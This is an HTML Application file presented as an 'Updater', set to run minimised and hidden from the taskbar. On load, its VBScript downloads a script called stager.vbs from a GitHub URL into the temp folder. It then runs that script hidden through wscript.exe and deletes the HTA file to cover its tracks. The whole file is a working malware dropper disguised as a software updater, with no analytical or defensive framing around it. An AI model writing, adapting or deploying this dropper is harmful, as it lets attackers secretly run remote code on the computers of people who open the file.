<!DOCTYPE html>
<html>
<head>
  <hta:application
    id="Updater"
    applicationname="Updater"
    singleinstance="yes"
    windowstate="minimize"
    showintaskbar="no"
  />
  <title>Updater</title>
  <script language="VBScript">
    Sub Window_OnLoad()
      Dim sh, fso, tempVbs, htaPath
      Dim xhr, ts

      ' 1) Create helpers & paths
      Set sh      = CreateObject("WScript.Shell")
      Set fso     = CreateObject("Scripting.FileSystemObject")
      tempVbs     = sh.ExpandEnvironmentStrings("%TEMP%") & "\stager.vbs"

      ' 2) Download stager.vbs via XMLHTTP
      Set xhr = CreateObject("MSXML2.ServerXMLHTTP.6.0")
      xhr.Open "GET", "https://raw.githubusercontent.com/concentratedsulfuricacid/vector/main/stager.vbs", False
      xhr.Send

      If xhr.Status = 200 Then
        ' 3) Write it to disk
        Set ts = fso.CreateTextFile(tempVbs, True, False)
        ts.Write xhr.ResponseText
        ts.Close

        ' 4) Execute hidden via WScript
        sh.Run "wscript.exe """ & tempVbs & """", 0, False
      Else
        ' (Optional) notify failure
        MsgBox "Download failed: HTTP " & xhr.Status, vbExclamation, "Updater Error"
      End If

      ' 5) Clean up the HTA and exit
      htaPath = document.location.pathname
      If fso.FileExists(htaPath) Then fso.DeleteFile htaPath, True
      self.close
    End Sub
  </script>
</head>
<body>
</body>
</html>
